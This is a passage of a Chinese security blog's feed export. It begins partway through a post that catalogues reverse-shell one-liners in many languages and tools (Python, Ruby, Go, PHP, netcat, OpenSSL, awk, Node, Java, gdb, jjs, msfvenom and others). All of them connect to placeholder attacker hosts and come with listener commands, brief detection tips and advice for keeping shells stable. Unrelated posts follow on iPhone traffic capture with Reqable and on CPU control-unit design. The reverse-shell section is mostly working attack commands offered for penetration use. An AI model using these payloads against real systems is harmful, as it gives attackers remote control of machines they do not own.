class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=</span><br><span class="line"><span class="string">&quot;&lt;attack_ip&gt;&quot;</span>;<span class="built_in">export</span> RPORT=&lt;attack_port&gt;;python3 -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>另一种</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><ul><li>安装了Ruby</li><li>Ruby 2.6</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install ruby ruby-devel rubygems rpm-build</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;&lt;attack_ip&gt;&quot;,&quot;&lt;attack_port&gt;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; <span class="built_in">rm</span> /tmp/t.go</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>反弹</p><blockquote><p>失败了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>第二个</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;);$proc=proc_open(&quot;/bin/sh -i&quot;,array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h2><blockquote><p>现代版本基本ban了</p></blockquote><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash &lt;attack_ip&gt; &lt;attack_port&gt;</span><br><span class="line">nc -c bash &lt;attack_ip&gt; &lt;attack_port&gt;</span><br></pre></td></tr></table></figure><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br><span class="line"><span class="built_in">ls</span> -al /proc/1882/fd <span class="comment">#看进程</span></span><br></pre></td></tr></table></figure><h2 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h2><blockquote><p>Netcat OpenBsd使⽤场景，当各个linux发⾏版本已经⾃带了netcat⼯具包，但是可能由于处于安</p><p>全考虑原⽣版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这⾥都被阉割了。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attack_ip&gt; &lt;attack_port&gt; &gt;/tmp/f</span><br></pre></td></tr></table></figure><ul><li><p>mkfifo：创建⼀个管道</p></li><li><p>cat /tmp/f：将管道⾥⾯的内容输出传递给/bin/sh</p></li><li><p>/bin/sh -i 2&gt;&amp;1：sh会执⾏管道⾥的命令并将标准输出和标准错误输出结果通过nc 传到该管道，</p><p>由此形成了⼀个回路</p></li></ul><h2 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h2><blockquote><p>nc和ncat的区别：只是采⽤不同的选项并具有不同的功能。</p><p>但是安装的Ncat有 -e参数了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat &lt;attack_ip&gt; &lt;attack_port&gt; -e /bin/bash</span><br></pre></td></tr></table></figure><h2 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h2><blockquote><p>常⽤的nc反弹流量都没有经过加密，容易被发现，使⽤ OpenSSL ⽣成证书⾃签名证书，通过mkfifo创</p><p>建⼀个管道将管道⾥⾯的内容输出传递给/bin/sh</p></blockquote><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;attack_port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">ncat --ssl -vv -l -p &lt;attack_port&gt;</span><br></pre></td></tr></table></figure><blockquote><p>先生成自签名证书</p></blockquote><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;attack_ip&gt;:&lt;attack_port&gt; &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure><h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><blockquote><p>未成功复现</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s =&quot;/inet/tcp/0/&lt;attack_ip&gt;/&lt;attack_port&gt;&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !=&quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure><h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><blockquote><p>安装luasocket</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;&lt;attack_ip&gt;&#x27;,&#x27;&lt;attack_port&gt;&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure><h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -e <span class="string">&#x27;(function()&#123;var net = require(&quot;net&quot;),cp = require(&quot;child_process&quot;),sh = cp.spawn(&quot;/bin/sh&quot;, []);var client = new net.Socket();client.connect(&lt;attack_port&gt;,&quot;&lt;attack_ip&gt;&quot;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim Exec.java</span><br><span class="line">public class Exec &#123;</span><br><span class="line">   public static void main(String[] args)throws Exception &#123;</span><br><span class="line">       Runtime r = Runtime.getRuntime();</span><br><span class="line">       Process p = r.exec(new String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec</span></span><br><span class="line"><span class="string">5&lt;&gt;/dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt;;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span> 2&gt;&amp;5</span></span><br><span class="line"><span class="string">&gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">       p.waitFor();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">javac Exec.java</span><br><span class="line">java Exec</span><br></pre></td></tr></table></figure><h2 id="Cpan"><a href="#Cpan" class="headerlink" title="Cpan"></a>Cpan</h2><blockquote><p>cpan 命令是⽤于与Perl下的CPAN模块进⾏交互的⼀个命令⾏⼯具。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpan use Socket; my <span class="variable">$i</span>= <span class="string">&quot;&lt;attack_ip&gt;&quot;</span>; my <span class="variable">$p</span>=&lt;attack_port&gt;; socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>)); <span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN, <span class="string">&quot;&gt;&amp;S&quot;</span>); open(STDOUT, <span class="string">&quot;&gt;&amp;S&quot;</span>); open(STDERR, <span class="string">&quot;&gt;&amp;S&quot;</span>); <span class="built_in">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">&#x27;python import sys,socket,os,pty; s=socket.socket(); s.connect((&quot;&lt;attack_ip&gt;&quot;, &lt;attack_port&gt;)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span> -ex quitx</span><br></pre></td></tr></table></figure><p>还是没法强交互</p><h2 id="easy-install"><a href="#easy-install" class="headerlink" title="easy_install"></a>easy_install</h2><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&#x27;&lt;attack_ip&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket() \</span></span><br><span class="line"><span class="string">s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))\</span></span><br><span class="line"><span class="string">[os.dup2(s.fileno(),fd) for fd in (0,1,2)] \</span></span><br><span class="line"><span class="string">pty.spawn(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">easy_install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><h2 id="IRB"><a href="#IRB" class="headerlink" title="IRB"></a>IRB</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&#x27;&lt;attack_ip&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">irb</span><br><span class="line">require <span class="string">&#x27;socket&#x27;</span>; <span class="built_in">exit</span> <span class="keyword">if</span></span><br><span class="line">fork;c=TCPSocket.new(ENV[<span class="string">&quot;RHOST&quot;</span>],ENV[<span class="string">&quot;RPORT&quot;</span>]);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,</span><br><span class="line"><span class="string">&quot;r&quot;</span>)</span><br><span class="line">&#123;|io|c.print io.read&#125; end</span><br></pre></td></tr></table></figure><h2 id="JJS"><a href="#JJS" class="headerlink" title="JJS"></a>JJS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=&lt;attack_ip&gt;</span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;var host=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RHOST&quot;);</span></span><br><span class="line"><span class="string">var port=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RPORT&quot;);</span></span><br><span class="line"><span class="string">var ProcessBuilder = Java.type(&quot;java.lang.ProcessBuilder&quot;);</span></span><br><span class="line"><span class="string">var p=new ProcessBuilder(&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">&quot;-i&quot;).redirectErrorStream(true).start();</span></span><br><span class="line"><span class="string">var Socket = Java.type(&quot;java.net.Socket&quot;);</span></span><br><span class="line"><span class="string">var s=new Socket(host,port);</span></span><br><span class="line"><span class="string">var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span></span><br><span class="line"><span class="string">var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;</span></span><br><span class="line"><span class="string">while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read());</span></span><br><span class="line"><span class="string">while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush();</span></span><br><span class="line"><span class="string">Java.type(&quot;java.lang.Thread&quot;).sleep(50); try &#123;p.exitValue();break;&#125;catch (e)</span></span><br><span class="line"><span class="string">&#123;&#125;&#125;;p.destroy();s.close();&#x27;</span> | jjs</span><br></pre></td></tr></table></figure><h2 id="jrunscript"><a href="#jrunscript" class="headerlink" title="jrunscript"></a>jrunscript</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=&lt;attack_ip&gt;</span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">jrunscript -e <span class="string">&#x27;var host=&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&quot;<span class="variable">$RHOST</span>&quot;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;; var port=&#x27;</span><span class="string">&quot;<span class="variable">$RPORT</span>&quot;</span><span class="string">&#x27;;var p=new java.lang.ProcessBuilder(&quot;/bin/bash&quot;,&quot;-i&quot;).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (e)&#123;&#125;&#125;;p.destroy();s.close();&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ksh"><a href="#ksh" class="headerlink" title="ksh"></a>ksh</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ksh -c <span class="string">&#x27;ksh -i &gt; /dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt; 2&gt;&amp;1 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>msf shell</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=4242 -f elf &gt; reverse.elf</span><br></pre></td></tr></table></figure><h1 id="接收shell注意事项"><a href="#接收shell注意事项" class="headerlink" title="接收shell注意事项"></a>接收shell注意事项</h1><h2 id="yakit接收"><a href="#yakit接收" class="headerlink" title="yakit接收"></a>yakit接收</h2><p>这边部署了一下公网上的yakit，效果不错</p><p>上文提到很多shell没法强交互，比如用vim之类的操作；这样会导致渗透的时候比较麻烦。</p><p>而yakit该工具能方便的开启tcp监听，同时所有的shell均有良好的交互性</p><blockquote><p>当然 yakit不止于此，是个很强大的工具</p><p>不过不建议在国内服务器部署 安全组的确比较麻烦人</p></blockquote><h2 id="安全组"><a href="#安全组" class="headerlink" title="安全组"></a>安全组</h2><p>有安全组的实例要先打开安全组</p><h2 id="进程阻塞"><a href="#进程阻塞" class="headerlink" title="进程阻塞"></a>进程阻塞</h2><p>有的shell利用会导致网站进程阻塞，避免测试麻烦，可以考虑将shell进程转入后台运行</p><p>挺多种办法的。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> &lt;cmd&gt; &amp;</span><br></pre></td></tr></table></figure><h1 id="安全声明"><a href="#安全声明" class="headerlink" title="安全声明"></a>安全声明</h1><p>本文内容仅供学习参考</p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reqable配合iphone抓包</title>
      <link href="/2024/06/07/"/>
      <url>/2024/06/07/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>学习计网的wireshark，对抓包工具有了点了解，然后试试更现代化的<strong>reqable</strong>工具，这个工具更适合批量分析、测试网站、小程序。</p><p>实验环境：</p><ul><li><p>MacOS系统 arm架构 </p></li><li><p>iphone13 Pro iOS 17.5.1</p></li><li>mac端的reqable和iOS端的reqable</li><li>一个数据线，用于连接iphone和mac</li></ul><h1 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h1><p>reqable的手机抓包可以依赖于同一局域网下的http代理，在reqable的帮助里面已经清楚的解释了</p><p>但是不足的是，在同一互联网下面我的iphone端reqable有时候无法连接到我的mac，（确认是同一网段），同时即使连上了也未必稳定。</p><blockquote><p>校园网环境是这样的</p></blockquote><p>于是我发现了mac的<strong>网络共享功能</strong></p><blockquote><p>该功能可以把mac端的wifi直接共享出来，给手机使用</p></blockquote><p>这里我把手机连上mac后，<strong>信任该电脑</strong></p><p>然后在macos系统设置下如下设置</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406071948479.png" alt="image-20240607194839425"></p><blockquote><p>两个USB的原因是有两个typec口都连过，都用上好了</p></blockquote><p>有时候会报错：你的互联网连接不能共享，因为它受802.1X保护。</p><p>一般不会报这个问题，我这边学校有俩wifi，换了另一个就行</p><p>确认开启以后把iphone的wifi 蜂窝网络都关掉 蓝牙也能关了</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406071950992.PNG" alt="IMG_3632" style="zoom:25%;"></p><p>现在手机没有wifi 蜂窝 但是可以成功访问正常的网站</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406071952964.jpeg" alt="IMG_92360AA2516B-1" style="zoom:25%;"></p><blockquote><p>有意思的是隔空投送也会显示有线连接 即使我开着蓝牙</p></blockquote><p>到现在，手机网络就全走的mac了</p><h1 id="连接reqable"><a href="#连接reqable" class="headerlink" title="连接reqable"></a>连接reqable</h1><blockquote><p>其实这一步就水到渠成了</p><p>因为两者已经在同一网段下，协同模式自然可以连接上</p><p>（物理连接才是最稳定的）</p></blockquote><p>前提先装好了两端的SSL证书</p><p>电脑端点击reqable左上角的手机协同 iphone用reqable去扫码</p><p>直接连接成功</p><p>注意开启抓包要在手机上启动reqable</p><p>然后随便访问一个手机网站 mac端有对应的流量</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406071958446.png" alt="image-20240607195821413"></p><blockquote><p>这看着清楚多啦</p><p>reqable适合测试api、小程序等</p><p>值得部署</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>控制单元的设计</title>
      <link href="/2024/06/02/"/>
      <url>/2024/06/02/</url>
      
        <content type="html"><![CDATA[<h1 id="组合逻辑设计"><a href="#组合逻辑设计" class="headerlink" title="组合逻辑设计"></a>组合逻辑设计</h1><h2 id="组合逻辑控制单元框图"><a href="#组合逻辑控制单元框图" class="headerlink" title="组合逻辑控制单元框图"></a>组合逻辑控制单元框图</h2><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022057517.png" alt="image-20240602205731495"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022057282.png" alt="image-20240602205748258"></p><h2 id="微操作的节拍安排"><a href="#微操作的节拍安排" class="headerlink" title="微操作的节拍安排"></a>微操作的节拍安排</h2><p>采用<strong>同步控制方式</strong></p><p>一个机器周期内有三个节拍</p><p>CPU内部采用的是非总线方式</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022059301.png" alt="image-20240602205902280"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022102358.png" alt="image-20240602210238340"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022102093.png" alt="image-20240602210250077"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022103835.png" alt="image-20240602210309820"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022103725.png" alt="image-20240602210318702"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022103396.png" alt="image-20240602210329379"></p><h1 id="微程序设计"><a href="#微程序设计" class="headerlink" title="微程序设计"></a>微程序设计</h1><blockquote><p>暂不加</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>控制单元的功能</title>
      <link href="/2024/06/02/"/>
      <url>/2024/06/02/</url>
      
        <content type="html"><![CDATA[<h1 id="微操作命令的分析"><a href="#微操作命令的分析" class="headerlink" title="微操作命令的分析"></a>微操作命令的分析</h1><p>完成一条指令分4个工作周期</p><ul><li>取指周期</li><li>间址周期</li><li>执行周期</li><li>中断周期</li></ul><h2 id="取指周期"><a href="#取指周期" class="headerlink" title="取指周期"></a>取指周期</h2><p>PC$\rightarrow$MAR</p><p>1$\rightarrow$R</p><p>M(MAR)$\rightarrow$MDR</p><p>MDR$\rightarrow$IR</p><p>OP(IR)$\rightarrow$CU</p><p>PC+1$\rightarrow$PC</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406021931103.png" alt="image-20240602193115027"></p><h2 id="间址周期"><a href="#间址周期" class="headerlink" title="间址周期"></a>间址周期</h2><p>指令形式地址$\rightarrow$MAR</p><p>Ad(IR)$\rightarrow$MAR<br>1$\rightarrow$R</p><p>M(MAR)$\rightarrow$MDR</p><p>MDR$\rightarrow$Ad(IR)</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406021940892.png" alt="截屏2024-06-02 19.40.34"></p><h2 id="执行周期"><a href="#执行周期" class="headerlink" title="执行周期"></a>执行周期</h2><p>非访存指令</p><ul><li>CLA 清A    0$\rightarrow$ACC</li><li>COM 取反  $\overline {\text{ACC}}\rightarrow$ACC</li><li>SHR 算术右移 L(ACC)$\rightarrow$R(ACC)，$ACC_0\rightarrow ACC_0$</li><li>CSL 循环左移  R(ACC)$\rightarrow$L(ACC)，$ACC_0\rightarrow ACC_n$</li><li>STP 停机指令   0$\rightarrow$G</li></ul><p>访存指令</p><ul><li>加法指令 ADD X<ul><li>AD(IR)$\rightarrow$MAR</li><li>1$\rightarrow$R</li><li>M(MAR)$\rightarrow$MDR</li><li>ACC+MDR$\rightarrow $ACC</li></ul></li><li>存数指令 STA  X<ul><li>AD(IR)$\rightarrow$MAR</li><li>1$\rightarrow$W</li><li>ACC$\rightarrow$MDR</li><li>MDR$\rightarrow$M(MAR)</li></ul></li><li>取数指令  LDA  X<ul><li>AD(IR)$\rightarrow$MAR</li><li>1$\rightarrow$R</li><li>M(MAR)$\rightarrow$MDR</li><li>MDR$\rightarrow$ACC</li></ul></li></ul><p>转移指令</p><ul><li>无条件转  JMP X<ul><li>AD(IR)$\rightarrow$PC</li></ul></li><li>条件转移  BAN X (负转)<ul><li>$A_0 \cdot Ad(IR)+\overline {\text{A}_0}(PC)\rightarrow$PC</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022008858.png" alt="image-20240602200806771"></p><h2 id="中断周期"><a href="#中断周期" class="headerlink" title="中断周期"></a>中断周期</h2><p>程序断点存入0地址，程序断点进栈</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022015313.png" alt="image-20240602201536791"></p><h1 id="控制单元的功能"><a href="#控制单元的功能" class="headerlink" title="控制单元的功能"></a>控制单元的功能</h1><h2 id="控制单元的外特性"><a href="#控制单元的外特性" class="headerlink" title="控制单元的外特性"></a>控制单元的外特性</h2><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022018627.png" alt="截屏2024-06-02 20.18.14"></p><h3 id="输入信号"><a href="#输入信号" class="headerlink" title="输入信号"></a>输入信号</h3><ul><li>时钟<ul><li>CU 受时钟控制</li><li>一个时钟脉冲发一个操作命令或一组需要同时执行的操作命令</li></ul></li><li>指令寄存器 OP（IR）$\rightarrow$CU<ul><li>控制信号与操作码有关</li></ul></li><li>标志<ul><li>CU受标志控制</li></ul></li><li>外来信号<ul><li>如INTR 中断请求</li><li>HRQ 总线请求</li></ul></li></ul><h3 id="输出信号"><a href="#输出信号" class="headerlink" title="输出信号"></a>输出信号</h3><ul><li>CPU内的各种控制信号<ul><li>$R_i\rightarrow R_j$</li><li>PC+1$\rightarrow$PC</li><li>ALU     +、-、与、或</li></ul></li><li>送至控制总线的信号<ul><li>$\overline {\text{MREQ}}$    访存控制信号</li><li>$\overline {\text{IO}}/\text{M}$  访IO/M存储器的控制信号</li><li>$\overline {\text{RD}}$  读命令</li><li>$\overline {\text{WD}}$  写命令</li><li>INTA 中断响应信号</li><li>HLDA 总线响应信号</li></ul></li></ul><h2 id="多级时序系统"><a href="#多级时序系统" class="headerlink" title="多级时序系统"></a>多级时序系统</h2><h3 id="机器周期"><a href="#机器周期" class="headerlink" title="机器周期"></a>机器周期</h3><blockquote><p>所有指令执行过程中的一个基准时间</p></blockquote><p>确定机器周期需要考虑</p><ul><li>每条指令的执行步骤</li><li>每一步骤所需的时间</li></ul><p>基准时间的确定</p><ul><li>以完成最复杂指令功能的时间为准</li><li>以访问一次存储器的时间为基准</li></ul><blockquote><p>若指令字长=存储字长则取指周期=机器周期</p></blockquote><h3 id="时钟周期"><a href="#时钟周期" class="headerlink" title="时钟周期"></a>时钟周期</h3><p>一个机器周期内可以完成若干个微操作</p><p>每个微操作需要一定时间</p><p>将一个机器周期分成若干个时间相等的时间段</p><p><strong>时钟周期是控制计算机操作的最小时间单位</strong></p><p><strong>用时钟周期控制产生一个或几个微操作命令</strong></p><h3 id="多级时序系统-1"><a href="#多级时序系统-1" class="headerlink" title="多级时序系统"></a>多级时序系统</h3><p><strong>机器周期、节拍(状态)组成多级时序系统</strong></p><p>一个指令周期包含若干个机器周期</p><p>一个机器周期包含若干个时钟周期</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022036041.png" alt="image-20240602203648004"></p><h3 id="机器速度与机器主频的关系"><a href="#机器速度与机器主频的关系" class="headerlink" title="机器速度与机器主频的关系"></a>机器速度与机器主频的关系</h3><p>机器的主频$f$越快机器速度也越快</p><p>在机器周期所含时钟周期数相同的前提下，两机平均指令执行速度之比等于两机主频之比</p><p>$\frac{MIPS_1}{MIPS_2}=\frac{f_1}{f_2}$</p><p><strong>机器速度不仅与主频有关，还和机器周期中所含的时钟周期数以及指令周期中所含的机器周期数有关</strong></p><h2 id="控制方式"><a href="#控制方式" class="headerlink" title="控制方式"></a>控制方式</h2><blockquote><p>产生不同微操作命令序列所用的时序控制方式</p></blockquote><h3 id="同步控制方式"><a href="#同步控制方式" class="headerlink" 